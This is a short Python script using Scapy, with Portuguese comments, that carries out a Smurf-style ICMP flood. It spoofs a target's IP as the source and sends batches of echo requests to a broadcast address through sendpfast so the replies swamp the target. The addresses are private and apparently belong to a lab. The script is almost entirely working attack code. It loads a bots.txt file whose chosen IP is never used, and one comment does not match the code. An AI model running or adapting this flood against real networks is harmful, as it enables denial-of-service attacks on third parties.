from scapy.all import *
import random
import time
import ipaddress

# Ataque ICMP Flood, sem payload (mínimo), spoofing de IP.
TARGET_IP = "192.168.100.2"
BOTFILE = "bots.txt"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0


    while True:
        dest_ip = random.choice(bot_ips)
        ip_layer = IP(src=TARGET_IP, dst="192.168.100.255") # O target receberá as replys (ping no Google)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0)  # Echo Request, sem payload
        packet = eth_layer / ip_layer / icmp_layer
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == 100:
            break


    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_icmp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 icmp_smurf.py
